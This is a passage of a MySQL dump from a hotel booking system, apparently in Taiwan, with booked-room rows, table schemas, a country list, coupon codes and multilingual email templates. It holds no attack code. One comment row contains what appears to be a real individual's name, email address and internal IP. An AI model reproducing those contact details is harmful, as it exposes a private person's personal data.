(404, 234, 6, '原木商務雙人房', NULL, 0, 2, 1400, 1400, NULL),
(405, 234, 6, '原木商務雙人房', NULL, 0, 2, 1400, 1400, NULL),
(406, 235, 1, '簡約雅致雙人房', NULL, 0, 2, 2800, 2800, NULL),
(407, 236, 5, '原木雅致雙人房', NULL, 1, 1, 1400, 1400, NULL),
(408, 236, 5, '原木雅致雙人房', NULL, 0, 2, 1400, 1400, NULL),
(409, 237, 10, '簡約雅逸三人房(無窗)', NULL, 0, 3, 2200, 2200, NULL),
(410, 237, 1, '簡約雅致雙人房', NULL, 0, 2, 1400, 1400, NULL),
(411, 238, 6, '原木商務雙人房', '', 0, 0, 0, NULL, 0),
(412, 238, 4, '簡約商務雙人房', '', 0, 0, 0, NULL, 0),
(413, 238, 4, '簡約商務雙人房', '', 0, 0, 0, NULL, 0),
(414, 238, 5, '原木雅致雙人房', '', 0, 0, 0, NULL, 0),
(415, 238, 5, '原木雅致雙人房', '', 0, 0, 0, NULL, 0),
(416, 238, 6, '原木商務雙人房', '', 0, 0, 0, NULL, 0),
(417, 238, 6, '原木商務雙人房', '', 0, 0, 0, NULL, 0),
(418, 238, 10, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(419, 239, 8, '迷你雙人房/和式單人房', '', 0, 0, 0, NULL, 0),
(420, 240, 7, '溫馨家庭房', NULL, 2, 2, 2800, 2800, NULL),
(421, 241, 1, '簡約雅致雙人房', NULL, 0, 2, 1400, 1400, NULL),
(422, 242, 6, '原木商務雙人房', '', 0, 0, 0, NULL, 0),
(423, 242, 6, '原木商務雙人房', '', 0, 0, 0, NULL, 0),
(424, 242, 1, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(425, 242, 5, '原木雅致雙人房', '', 0, 0, 0, NULL, 0),
(426, 242, 5, '原木雅致雙人房', '', 0, 0, 0, NULL, 0),
(427, 242, 4, '簡約商務雙人房', '', 0, 0, 0, NULL, 0),
(428, 243, 4, '簡約商務雙人房', '', 0, 0, 0, NULL, 0),
(429, 243, 1, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(430, 244, 8, '迷你雙人房/和式單人房', NULL, 0, 1, 1200, 1200, NULL),
(431, 245, 7, '溫馨家庭房', NULL, 2, 2, 2800, 2800, NULL),
(432, 246, 5, '原木雅致雙人房', NULL, 0, 1, 1400, 1400, NULL),
(433, 247, 4, '簡約商務雙人房', NULL, 0, 2, 2800, 2800, NULL),
(434, 248, 6, '原木商務雙人房', NULL, 0, 1, 1400, 1400, NULL),
(435, 249, 8, '迷你雙人房/和式單人房', NULL, 0, 1, 1200, 1200, NULL),
(436, 250, 5, '原木商務雙人房', '', 0, 0, 0, NULL, 0),
(437, 250, 5, '原木雅致雙人房', '', 0, 0, 0, NULL, 0),
(438, 250, 6, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(439, 250, 6, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(440, 250, 1, '簡約商務雙人房', '', 0, 0, 0, NULL, 0),
(441, 250, 1, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(442, 250, 4, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(443, 250, 4, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(444, 250, 7, '溫馨家庭房', '', 0, 0, 0, NULL, 0),
(445, 250, 8, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(446, 250, 9, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(447, 250, 10, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(448, 250, 11, '簡約雅致雙人房', '', 0, 0, 0, NULL, 0),
(449, 251, 1, '簡約雅致雙人房', NULL, 0, 2, 3600, 3600, NULL),
(450, 252, 1, '簡約雅致雙人房', NULL, 0, 1, 1400, 1400, NULL);

-- --------------------------------------------------------

--
-- 資料表結構 `pm_booking_service`
--

CREATE TABLE `pm_booking_service` (
  `id` int(11) NOT NULL,
  `id_booking` int(11) NOT NULL,
  `id_service` int(11) DEFAULT NULL,
  `title` varchar(250) DEFAULT NULL,
  `qty` int(11) DEFAULT 0,
  `amount` double DEFAULT 0,
  `ex_tax` double DEFAULT 0,
  `tax_rate` double DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

-- --------------------------------------------------------

--
-- 資料表結構 `pm_booking_tax`
--

CREATE TABLE `pm_booking_tax` (
  `id` int(11) NOT NULL,
  `id_booking` int(11) NOT NULL,
  `id_tax` int(11) DEFAULT NULL,
  `name` varchar(50) DEFAULT NULL,
  `amount` double DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

-- --------------------------------------------------------

--
-- 資料表結構 `pm_comment`
--

CREATE TABLE `pm_comment` (
  `id` int(11) NOT NULL,
  `item_type` varchar(30) DEFAULT NULL,
  `id_item` int(11) DEFAULT NULL,
  `rating` int(11) DEFAULT NULL,
  `checked` int(11) DEFAULT 0,
  `add_date` int(11) DEFAULT NULL,
  `edit_date` int(11) DEFAULT NULL,
  `name` varchar(100) DEFAULT NULL,
  `email` varchar(100) DEFAULT NULL,
  `msg` longtext DEFAULT NULL,
  `ip` varchar(50) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

--
-- 傾印資料表的資料 `pm_comment`
--

INSERT INTO `pm_comment` (`id`, `item_type`, `id_item`, `rating`, `checked`, `add_date`, `edit_date`, `name`, `email`, `msg`, `ip`) VALUES
(1, 'room', 7, 2, NULL, 1654676241, NULL, '簡名弘', 's10017@ising.com.tw', '請問可以攜帶寵物嗎', '192.168.63.43');

-- --------------------------------------------------------

--
-- 資料表結構 `pm_country`
--

CREATE TABLE `pm_country` (
  `id` int(11) NOT NULL,
  `name` varchar(100) DEFAULT NULL,
  `code` varchar(3) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

--
-- 傾印資料表的資料 `pm_country`
--

INSERT INTO `pm_country` (`id`, `name`, `code`) VALUES
(1, 'Afghanistan', 'AF'),
(2, 'Åland', 'AX'),
(3, 'Albania', 'AL'),
(4, 'Algeria', 'DZ'),
(5, 'American Samoa', 'AS'),
(6, 'Andorra', 'AD'),
(7, 'Angola', 'AO'),
(8, 'Anguilla', 'AI'),
(9, 'Antarctica', 'AQ'),
(10, 'Antigua and Barbuda', 'AG'),
(11, 'Argentina', 'AR'),
(12, 'Armenia', 'AM'),
(13, 'Aruba', 'AW'),
(14, 'Australia', 'AU'),
(15, 'Austria', 'AT'),
(16, 'Azerbaijan', 'AZ'),
(17, 'Bahamas', 'BS'),
(18, 'Bahrain', 'BH'),
(19, 'Bangladesh', 'BD'),
(20, 'Barbados', 'BB'),
(21, 'Belarus', 'BY'),
(22, 'Belgium', 'BE'),
(23, 'Belize', 'BZ'),
(24, 'Benin', 'BJ'),
(25, 'Bermuda', 'BM'),
(26, 'Bhutan', 'BT'),
(27, 'Bolivia', 'BO'),
(28, 'Bonaire', 'BQ'),
(29, 'Bosnia and Herzegovina', 'BA'),
(30, 'Botswana', 'BW'),
(31, 'Bouvet Island', 'BV'),
(32, 'Brazil', 'BR'),
(33, 'British Indian Ocean Territory', 'IO'),
(34, 'British Virgin Islands', 'VG'),
(35, 'Brunei', 'BN'),
(36, 'Bulgaria', 'BG'),
(37, 'Burkina Faso', 'BF'),
(38, 'Burundi', 'BI'),
(39, 'Cambodia', 'KH'),
(40, 'Cameroon', 'CM'),
(41, 'Canada', 'CA'),
(42, 'Cape Verde', 'CV'),
(43, 'Cayman Islands', 'KY'),
(44, 'Central African Republic', 'CF'),
(45, 'Chad', 'TD'),
(46, 'Chile', 'CL'),
(47, 'China', 'CN'),
(48, 'Christmas Island', 'CX'),
(49, 'Cocos [Keeling] Islands', 'CC'),
(50, 'Colombia', 'CO'),
(51, 'Comoros', 'KM'),
(52, 'Cook Islands', 'CK'),
(53, 'Costa Rica', 'CR'),
(54, 'Croatia', 'HR'),
(55, 'Cuba', 'CU'),
(56, 'Curacao', 'CW'),
(57, 'Cyprus', 'CY'),
(58, 'Czech Republic', 'CZ'),
(59, 'Democratic Republic of the Congo', 'CD'),
(60, 'Denmark', 'DK'),
(61, 'Djibouti', 'DJ'),
(62, 'Dominica', 'DM'),
(63, 'Dominican Republic', 'DO'),
(64, 'East Timor', 'TL'),
(65, 'Ecuador', 'EC'),
(66, 'Egypt', 'EG'),
(67, 'El Salvador', 'SV'),
(68, 'Equatorial Guinea', 'GQ'),
(69, 'Eritrea', 'ER'),
(70, 'Estonia', 'EE'),
(71, 'Ethiopia', 'ET'),
(72, 'Falkland Islands', 'FK'),
(73, 'Faroe Islands', 'FO'),
(74, 'Fiji', 'FJ'),
(75, 'Finland', 'FI'),
(76, 'France', 'FR'),
(77, 'French Guiana', 'GF'),
(78, 'French Polynesia', 'PF'),
(79, 'French Southern Territories', 'TF'),
(80, 'Gabon', 'GA'),
(81, 'Gambia', 'GM'),
(82, 'Georgia', 'GE'),
(83, 'Germany', 'DE'),
(84, 'Ghana', 'GH'),
(85, 'Gibraltar', 'GI'),
(86, 'Greece', 'GR'),
(87, 'Greenland', 'GL'),
(88, 'Grenada', 'GD'),
(89, 'Guadeloupe', 'GP'),
(90, 'Guam', 'GU'),
(91, 'Guatemala', 'GT'),
(92, 'Guernsey', 'GG'),
(93, 'Guinea', 'GN'),
(94, 'Guinea-Bissau', 'GW'),
(95, 'Guyana', 'GY'),
(96, 'Haiti', 'HT'),
(97, 'Heard Island and McDonald Islands', 'HM'),
(98, 'Honduras', 'HN'),
(99, 'Hong Kong', 'HK'),
(100, 'Hungary', 'HU'),
(101, 'Iceland', 'IS'),
(102, 'India', 'IN'),
(103, 'Indonesia', 'ID'),
(104, 'Iran', 'IR'),
(105, 'Iraq', 'IQ'),
(106, 'Ireland', 'IE'),
(107, 'Isle of Man', 'IM'),
(108, 'Israel', 'IL'),
(109, 'Italy', 'IT'),
(110, 'Ivory Coast', 'CI'),
(111, 'Jamaica', 'JM'),
(112, 'Japan', 'JP'),
(113, 'Jersey', 'JE'),
(114, 'Jordan', 'JO'),
(115, 'Kazakhstan', 'KZ'),
(116, 'Kenya', 'KE'),
(117, 'Kiribati', 'KI'),
(118, 'Kosovo', 'XK'),
(119, 'Kuwait', 'KW'),
(120, 'Kyrgyzstan', 'KG'),
(121, 'Laos', 'LA'),
(122, 'Latvia', 'LV'),
(123, 'Lebanon', 'LB'),
(124, 'Lesotho', 'LS'),
(125, 'Liberia', 'LR'),
(126, 'Libya', 'LY'),
(127, 'Liechtenstein', 'LI'),
(128, 'Lithuania', 'LT'),
(129, 'Luxembourg', 'LU'),
(130, 'Macao', 'MO'),
(131, 'Macedonia', 'MK'),
(132, 'Madagascar', 'MG'),
(133, 'Malawi', 'MW'),
(134, 'Malaysia', 'MY'),
(135, 'Maldives', 'MV'),
(136, 'Mali', 'ML'),
(137, 'Malta', 'MT'),
(138, 'Marshall Islands', 'MH'),
(139, 'Martinique', 'MQ'),
(140, 'Mauritania', 'MR'),
(141, 'Mauritius', 'MU'),
(142, 'Mayotte', 'YT'),
(143, 'Mexico', 'MX'),
(144, 'Micronesia', 'FM'),
(145, 'Moldova', 'MD'),
(146, 'Monaco', 'MC'),
(147, 'Mongolia', 'MN'),
(148, 'Montenegro', 'ME'),
(149, 'Montserrat', 'MS'),
(150, 'Morocco', 'MA'),
(151, 'Mozambique', 'MZ'),
(152, 'Myanmar [Burma]', 'MM'),
(153, 'Namibia', 'NA'),
(154, 'Nauru', 'NR'),
(155, 'Nepal', 'NP'),
(156, 'Netherlands', 'NL'),
(157, 'New Caledonia', 'NC'),
(158, 'New Zealand', 'NZ'),
(159, 'Nicaragua', 'NI'),
(160, 'Niger', 'NE'),
(161, 'Nigeria', 'NG'),
(162, 'Niue', 'NU'),
(163, 'Norfolk Island', 'NF'),
(164, 'North Korea', 'KP'),
(165, 'Northern Mariana Islands', 'MP'),
(166, 'Norway', 'NO'),
(167, 'Oman', 'OM'),
(168, 'Pakistan', 'PK'),
(169, 'Palau', 'PW'),
(170, 'Palestine', 'PS'),
(171, 'Panama', 'PA'),
(172, 'Papua New Guinea', 'PG'),
(173, 'Paraguay', 'PY'),
(174, 'Peru', 'PE'),
(175, 'Philippines', 'PH'),
(176, 'Pitcairn Islands', 'PN'),
(177, 'Poland', 'PL'),
(178, 'Portugal', 'PT'),
(179, 'Puerto Rico', 'PR'),
(180, 'Qatar', 'QA'),
(181, 'Republic of the Congo', 'CG'),
(182, 'Réunion', 'RE'),
(183, 'Romania', 'RO'),
(184, 'Russia', 'RU'),
(185, 'Rwanda', 'RW'),
(186, 'Saint Barthélemy', 'BL'),
(187, 'Saint Helena', 'SH'),
(188, 'Saint Kitts and Nevis', 'KN'),
(189, 'Saint Lucia', 'LC'),
(190, 'Saint Martin', 'MF'),
(191, 'Saint Pierre and Miquelon', 'PM'),
(192, 'Saint Vincent and the Grenadines', 'VC'),
(193, 'Samoa', 'WS'),
(194, 'San Marino', 'SM'),
(195, 'São Tomé and Príncipe', 'ST'),
(196, 'Saudi Arabia', 'SA'),
(197, 'Senegal', 'SN'),
(198, 'Serbia', 'RS'),
(199, 'Seychelles', 'SC'),
(200, 'Sierra Leone', 'SL'),
(201, 'Singapore', 'SG'),
(202, 'Sint Maarten', 'SX'),
(203, 'Slovakia', 'SK'),
(204, 'Slovenia', 'SI'),
(205, 'Solomon Islands', 'SB'),
(206, 'Somalia', 'SO'),
(207, 'South Africa', 'ZA'),
(208, 'South Georgia and the South Sandwich Islands', 'GS'),
(209, 'South Korea', 'KR'),
(210, 'South Sudan', 'SS'),
(211, 'Spain', 'ES'),
(212, 'Sri Lanka', 'LK'),
(213, 'Sudan', 'SD'),
(214, 'Suriname', 'SR'),
(215, 'Svalbard and Jan Mayen', 'SJ'),
(216, 'Swaziland', 'SZ'),
(217, 'Sweden', 'SE'),
(218, 'Switzerland', 'CH'),
(219, 'Syria', 'SY'),
(220, 'Taiwan', 'TW'),
(221, 'Tajikistan', 'TJ'),
(222, 'Tanzania', 'TZ'),
(223, 'Thailand', 'TH'),
(224, 'Togo', 'TG'),
(225, 'Tokelau', 'TK'),
(226, 'Tonga', 'TO'),
(227, 'Trinidad and Tobago', 'TT'),
(228, 'Tunisia', 'TN'),
(229, 'Turkey', 'TR'),
(230, 'Turkmenistan', 'TM'),
(231, 'Turks and Caicos Islands', 'TC'),
(232, 'Tuvalu', 'TV'),
(233, 'U.S. Minor Outlying Islands', 'UM'),
(234, 'U.S. Virgin Islands', 'VI'),
(235, 'Uganda', 'UG'),
(236, 'Ukraine', 'UA'),
(237, 'United Arab Emirates', 'AE'),
(238, 'United Kingdom', 'GB'),
(239, 'United States', 'US'),
(240, 'Uruguay', 'UY'),
(241, 'Uzbekistan', 'UZ'),
(242, 'Vanuatu', 'VU'),
(243, 'Vatican City', 'VA'),
(244, 'Venezuela', 'VE'),
(245, 'Vietnam', 'VN'),
(246, 'Wallis and Futuna', 'WF'),
(247, 'Western Sahara', 'EH'),
(248, 'Yemen', 'YE'),
(249, 'Zambia', 'ZM'),
(250, 'Zimbabwe', 'ZW');

-- --------------------------------------------------------

--
-- 資料表結構 `pm_coupon`
--

CREATE TABLE `pm_coupon` (
  `id` int(11) NOT NULL,
  `title` varchar(250) DEFAULT NULL,
  `code` varchar(50) DEFAULT NULL,
  `discount` double DEFAULT 0,
  `discount_type` varchar(10) DEFAULT NULL,
  `rooms` text DEFAULT NULL,
  `once` int(11) DEFAULT NULL,
  `checked` int(11) DEFAULT 0,
  `publish_date` int(11) DEFAULT NULL,
  `unpublish_date` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

--
-- 傾印資料表的資料 `pm_coupon`
--

INSERT INTO `pm_coupon` (`id`, `title`, `code`, `discount`, `discount_type`, `rooms`, `once`, `checked`, `publish_date`, `unpublish_date`) VALUES
(1, 'goh2083', '2083', 10, 'fixed', '', 0, 1, 1656468360, 1659196800),
(2, '新官網上線優惠', 'isingnew', 100, 'fixed', '1,4,5,6,7,9,10,11', 1, 3, 1664241480, 1667145600);

-- --------------------------------------------------------

--
-- 資料表結構 `pm_currency`
--

CREATE TABLE `pm_currency` (
  `id` int(11) NOT NULL,
  `code` varchar(5) DEFAULT NULL,
  `sign` varchar(5) DEFAULT NULL,
  `main` int(11) DEFAULT 0,
  `rank` int(11) DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

--
-- 傾印資料表的資料 `pm_currency`
--

INSERT INTO `pm_currency` (`id`, `code`, `sign`, `main`, `rank`) VALUES
(1, 'USD', '$', 0, 1),
(2, 'EUR', '€', 0, 2),
(3, 'GBP', '£', 0, 3),
(4, 'INR', '₹', 0, 4),
(5, 'AUD', 'A$', 0, 5),
(6, 'CAD', 'C$', 0, 6),
(7, 'CNY', '¥', 0, 7),
(8, 'TRY', '₺', 0, 8),
(9, 'NTD', '$', 1, 9);

-- --------------------------------------------------------

--
-- 資料表結構 `pm_email_content`
--

CREATE TABLE `pm_email_content` (
  `id` int(11) NOT NULL,
  `lang` int(11) NOT NULL,
  `name` varchar(50) DEFAULT NULL,
  `subject` varchar(250) DEFAULT NULL,
  `content` text DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

--
-- 傾印資料表的資料 `pm_email_content`
--

INSERT INTO `pm_email_content` (`id`, `lang`, `name`, `subject`, `content`) VALUES
(1, 1, 'CONTACT', 'Contact', '<b>Nom:</b> {name}\r\n<b>Adresse:</b> {address}\r\n<b>Téléphone:</b> {phone}\r\n<b>E-mail:</b> {email}\r\n<b>Message:</b>\r\n{msg}'),
(1, 2, 'CONTACT', '聯絡我們', '<p><strong>名稱：</strong>{name}<br><strong>地址：</strong> {address}<br><strong>手機：</strong>{phone}<br><strong>電子郵件：</strong> {email}<br>訊息：<br>{msg}</p>'),
(1, 3, 'CONTACT', 'Contact', '<b>Name:</b> {name}\r\n<b>Address:</b> {address}\r\n<b>Phone:</b> {phone}\r\n<b>E-mail:</b> {email}\r\n<b>Message:</b>\r\n{msg}'),
(1, 5, 'CONTACT', '聯絡我們', '<p><strong>名稱：</strong>{name}<br><strong>地址：</strong> {address}<br><strong>手機：</strong>{phone}<br><strong>電子郵件：</strong> {email}<br>訊息：<br>{msg}</p>'),
(2, 1, 'BOOKING_REQUEST', 'Demande de réservation', '<p><b>Adresse de facturation</b><br />\r\n{firstname} {lastname}<br />\r\n{address}<br />\r\n{postcode} {city}<br />\r\nSociété : {company}<br />\r\nTéléphone : {phone}<br />\r\nMobile : {mobile}<br />\r\nEmail : {email}</p>\r\n\r\n<p><strong>Détails de la réservation</strong><br />\r\nArrivée : <b>{Check_in}</b><br />\r\nDépart : <b>{Check_out}</b><br />\r\n<b>{num_nights}</b> nuit(s)<br />\r\n<b>{num_guests}</b> personne(s) - Adulte(s) : <b>{num_adults}</b> / Enfant(s) : <b>{num_children}</b></p>\r\n\r\n<p><b>Chambres</b></p>\r\n\r\n<p>{rooms}</p>\r\n\r\n<p><b>Services supplémentaires</b></p>\r\n\r\n<p>{extra_services}</p>\r\n\r\n<p><b>Activités</b></p>\r\n\r\n<p>{activities}</p>\r\n\r\n<p><b>Commentaires</b><br />\r\n{comments}</p>\r\n'),
(2, 2, 'BOOKING_REQUEST', '訂房申請', '<p><strong>付款地址</strong><br>{firstname} {lastname}<br>{address}<br>{postcode} {city}<br>公司： {company}<br>電話： {phone}<br>手機： {mobile}<br>電子郵件： {email}</p><p><strong>訂房資訊</strong><br>入住 <strong>{Check_in}</strong><br>退房 <strong>{Check_out}</strong><br><strong>{num_nights}</strong> 晚<br><strong>{num_guests}</strong> 人 - 成人： <strong>{num_adults}</strong> / 孩童： <strong>{num_children}</strong></p><p><strong>客房</strong></p><p>{rooms}</p><p><strong>額外服務</strong></p><p>{extra_services}</p><p>活動</p><p>{activities}</p><p>備註<br>{comments}</p>'),
(2, 3, 'BOOKING_REQUEST', 'Booking request', '<p><b>Billing address</b><br />\r\n{firstname} {lastname}<br />\r\n{address}<br />\r\n{postcode} {city}<br />\r\nCompany: {company}<br />\r\nPhone: {phone}<br />\r\nMobile: {mobile}<br />\r\nEmail: {email}</p>\r\n\r\n<p><strong>Booking details</strong><br />\r\nCheck in <b>{Check_in}</b><br />\r\nCheck out <b>{Check_out}</b><br />\r\n<b>{num_nights}</b> nights<br />\r\n<b>{num_guests}</b> persons - Adults: <b>{num_adults}</b> / Children: <b>{num_children}</b></p>\r\n\r\n<p><strong>Rooms</strong></p>\r\n\r\n<p>{rooms}</p>\r\n\r\n<p><b>Extra services</b></p>\r\n\r\n<p>{extra_services}</p>\r\n\r\n<p><b>Activities</b></p>\r\n\r\n<p>{activities}</p>\r\n\r\n<p><b>Comments</b><br />\r\n{comments}</p>\r\n'),
(2, 5, 'BOOKING_REQUEST', '訂房申請', '<p><strong>付款地址</strong><br>{firstname} {lastname}<br>{address}<br>{postcode} {city}<br>公司： {company}<br>電話： {phone}<br>手機： {mobile}<br>電子郵件： {email}</p><p><strong>訂房資訊</strong><br>入住 <strong>{Check_in}</strong><br>退房 <strong>{Check_out}</strong><br><strong>{num_nights}</strong> 晚<br><strong>{num_guests}</strong> 人 - 成人： <strong>{num_adults}</strong> / 孩童： <strong>{num_children}</strong></p><p><strong>客房</strong></p><p>{rooms}</p><p><strong>額外服務</strong></p><p>{extra_services}</p><p>活動</p><p>{activities}</p><p>備註<br>{comments}</p>'),
(3, 1, 'BOOKING_CONFIRMATION', 'Confirmation de réservation', '<p><b>Adresse de facturation</b><br />\r\n{firstname} {lastname}<br />\r\n{address}<br />\r\n{postcode} {city}<br />\r\nSociété : {company}<br />\r\nTéléphone : {phone}<br />\r\nMobile : {mobile}<br />\r\nEmail : {email}</p>\r\n\r\n<p><strong>Détails de la réservation</strong><br />\r\nArrivée : <b>{Check_in}</b><br />\r\nDépart : <b>{Check_out}</b><br />\r\n<b>{num_nights}</b> nuit(s)<br />\r\n<b>{num_guests}</b> personne(s) - Adulte(s) : <b>{num_adults}</b> / Enfant(s) : <b>{num_children}</b></p>\r\n\r\n<p><b>Chambres</b></p>\r\n\r\n<p>{rooms}</p>\r\n\r\n<p><b>Services supplémentaires</b></p>\r\n\r\n<p>{extra_services}</p>\r\n\r\n<p><b>Activités</b></p>\r\n\r\n<p>{activities}</p>\r\n\r\n<p>Taxe de séjour : {tourist_tax}<br />\r\nRéduction: {discount}<br />\r\n{taxes}<br />\r\nTotal : <strong>{total} TTC</strong></p>\r\n\r\n<p>Acompte : <strong>{down_payment} TTC</strong></p>\r\n\r\n<p><b>Commentaires</b><br />\r\n{comments}</p>\r\n\r\n<p>{payment_notice}</p>\r\n'),
(3, 2, 'BOOKING_CONFIRMATION', '訂房確認', '<p><strong>Billing address</strong><br>{firstname} {lastname}<br>{address}<br>{postcode} {city}<br>Company: {company}<br>Phone: {phone}<br>Mobile: {mobile}<br>Email: {email}</p><p><strong>訂房詳情</strong><br>Check in <strong>{Check_in}</strong><br>Check out <strong>{Check_out}</strong><br><strong>{num_nights}</strong> nights<br><strong>{num_guests}</strong> persons - Adults: <strong>{num_adults}</strong> / Children: <strong>{num_children}</strong></p><p><strong>Rooms</strong></p><p>{rooms}</p><p><strong>Extra services</strong></p><p>{extra_services}</p><p><strong>Activities</strong></p><p>{activities}</p><p>折扣： {discount}<br>{taxes}<br><span style=\"color:rgb(51,51,51);\">總額：</span> <strong>{total} </strong></p><p>備註<br>{comments}</p><p>{payment_notice}</p>'),
(3, 3, 'BOOKING_CONFIRMATION', 'Booking confirmation', '<p><b>Billing address</b><br />\r\n{firstname} {lastname}<br />\r\n{address}<br />\r\n{postcode} {city}<br />\r\nCompany: {company}<br />\r\nPhone: {phone}<br />\r\nMobile: {mobile}<br />\r\nEmail: {email}</p>\r\n\r\n<p><strong>Booking details</strong><br />\r\nCheck in <b>{Check_in}</b><br />\r\nCheck out <b>{Check_out}</b><br />\r\n<b>{num_nights}</b> nights<br />\r\n<b>{num_guests}</b> persons - Adults: <b>{num_adults}</b> / Children: <b>{num_children}</b></p>\r\n\r\n<p><strong>Rooms</strong></p>\r\n\r\n<p>{rooms}</p>\r\n\r\n<p><b>Extra services</b></p>\r\n\r\n<p>{extra_services}</p>\r\n\r\n<p><b>Activities</b></p>\r\n\r\n<p>{activities}</p>\r\n\r\n<p>Tourist tax: {tourist_tax}<br />\r\nDiscount: {discount}<br />\r\n{taxes}<br />\r\nTotal: <strong>{total} incl. VAT</strong></p>\r\n\r\n<p>Down payment: <strong>{down_payment} incl. VAT</strong></p>\r\n\r\n<p><b>Comments</b><br />\r\n{comments}</p>\r\n\r\n<p>{payment_notice}</p>\r\n'),
(3, 5, 'BOOKING_CONFIRMATION', '訂房確認', '<p><strong>Billing address</strong><br>{firstname} {lastname}<br>{address}<br>{postcode} {city}<br>Company: {company}<br>Phone: {phone}<br>Mobile: {mobile}<br>Email: {email}</p><p><strong>訂房詳情</strong><br>Check in <strong>{Check_in}</strong><br>Check out <strong>{Check_out}</strong><br><strong>{num_nights}</strong> nights<br><strong>{num_guests}</strong> persons - Adults: <strong>{num_adults}</strong> / Children: <strong>{num_children}</strong></p><p><strong>Rooms</strong></p><p>{rooms}</p><p><strong>Extra services</strong></p><p>{extra_services}</p><p><strong>Activities</strong></p><p>{activities}</p><p>折扣： {discount}<br>{taxes}<br><span style=\"color:rgb(51,51,51);\">總額：</span> <strong>{total} </strong></p><p>備註<br>{comments}</p><p>{payment_notice}</p>'),
(4, 1, 'ACCOUNT_CONFIRMATION', 'Confirmation du compte', '<p>Bonjour,<br />\r\nVous avez cr&eacute;&eacute; un nouveau compte.<br />\r\nCliquez sur le lien ci-dessous pour valider votre compte:<br />\r\n<a href=\"{link}\">Valider mon compte</a></p>\r\n'),
(4, 2, 'ACCOUNT_CONFIRMATION', '驗證您的帳戶', '<p>您好，<br>您創建了一個新帳戶。<br>單擊下面的連結以驗證您的帳戶：<br><a href=\"{link}\">Validate my new account</a></p>'),
(4, 3, 'ACCOUNT_CONFIRMATION', 'Validate your account', '<p>Hi,<br />\r\nYou created a new account.<br />\r\nClick on the link bellow to validate your account:<br />\r\n<a href=\"{link}\">Validate my new account</a></p>\r\n'),
(4, 5, 'ACCOUNT_CONFIRMATION', '驗證您的帳戶', '<p>您好，<br>您創建了一個新帳戶。<br>單擊下面的連結以驗證您的帳戶：<br><a href=\"{link}\">Validate my new account</a></p>');

-- --------------------------------------------------------

--
-- 資料表結構 `pm_facility`
--

CREATE TABLE `pm_facility` (
  `id` int(11) NOT NULL,
  `lang` int(11) NOT NULL,
  `name` varchar(250) DEFAULT NULL,
  `rank` int(11) DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

--
-- 傾印資料表的資料 `pm_facility`
--

INSERT INTO `pm_facility` (`id`, `lang`, `name`, `rank`) VALUES
(1, 1, 'Climatisation', NULL),
(1, 2, '空調', NULL),
(1, 3, '', NULL),
(1, 5, '空調', NULL),
(2, 1, 'Lit bébé', NULL),
(2, 2, '嬰兒床', NULL),
(2, 3, '', NULL),
(2, 5, '嬰兒床', NULL),
(3, 1, 'Balcon', NULL),
(3, 2, '陽台', NULL),
(3, 3, '', NULL),
(3, 5, '陽台', NULL),
(5, 1, 'Salle de bain', NULL),
(5, 2, '浴室', NULL),
(5, 3, '', NULL),
(5, 5, '浴室', NULL),
(6, 1, 'Cafetière', 6),
(6, 2, '咖啡機', NULL),
(6, 5, '咖啡機', NULL),
(7, 1, 'Plaque de cuisson', 7),
(7, 2, '烹飪台', NULL),
(7, 5, '烹飪台', NULL),
(8, 1, 'Bureau', 8),
(8, 2, '桌台', NULL),
(8, 5, '桌台', NULL),
(10, 1, 'Ventilateur', NULL),
(10, 2, '電風扇', NULL),
(10, 3, '', NULL),
(10, 5, '電風扇', NULL),
(11, 1, 'Parking gratuit', NULL),
(11, 2, '免費停車', NULL),
(11, 3, '', NULL),
(11, 5, '免費停車', NULL),
(12, 1, 'Réfrigérateur', NULL),
(12, 2, '冰箱', NULL),
(12, 3, '', NULL),
(12, 5, '冰箱', NULL),
(13, 1, 'Sèche-cheveux', NULL),
(13, 2, '吹風機', NULL),
(13, 3, '', NULL),
(13, 5, '吹風機', NULL),
(14, 1, 'Internet', NULL),
(14, 2, '有線網路', NULL),
(14, 3, '', NULL),
(14, 5, '有線網路', NULL),
(15, 1, 'Fer à repasser', 15),
(15, 2, '熨斗', NULL),
(15, 5, '熨斗', NULL),
(16, 1, 'Micro-ondes', NULL),
(16, 2, '微波爐', NULL),
(16, 3, '', NULL),
(16, 5, '微波爐', NULL),
(18, 1, 'Non-fumeurs', NULL),
(18, 2, '禁菸房', NULL),
(18, 3, '', NULL),
(18, 5, '禁菸房', NULL),
(19, 1, 'Parking payant', NULL),
(19, 2, '付費停車', NULL),
(19, 3, '', NULL),
(19, 5, '付費停車', NULL),
(20, 1, 'Animaux acceptés', NULL),
(20, 2, '可攜寵物入內', NULL),
(20, 3, '', NULL),
(20, 5, '可攜寵物入內', NULL),
(21, 1, 'Animaux interdits', NULL),
(21, 2, '禁止寵物入內', NULL),
(21, 3, '', NULL),
(21, 5, '禁止寵物入內', NULL),
(22, 1, 'Radio', NULL),
(22, 2, '收音機', NULL),
(22, 3, '', NULL),
(22, 5, '收音機', NULL),
(24, 1, 'Chaines satellite', NULL),
(24, 2, '有線電視', NULL),
(24, 3, '', NULL),
(24, 5, '有線電視', NULL),
(25, 1, 'Salle d\'eau', NULL),
(25, 2, '淋浴間', NULL),
(25, 3, '', NULL),
(25, 5, '淋浴間', NULL),
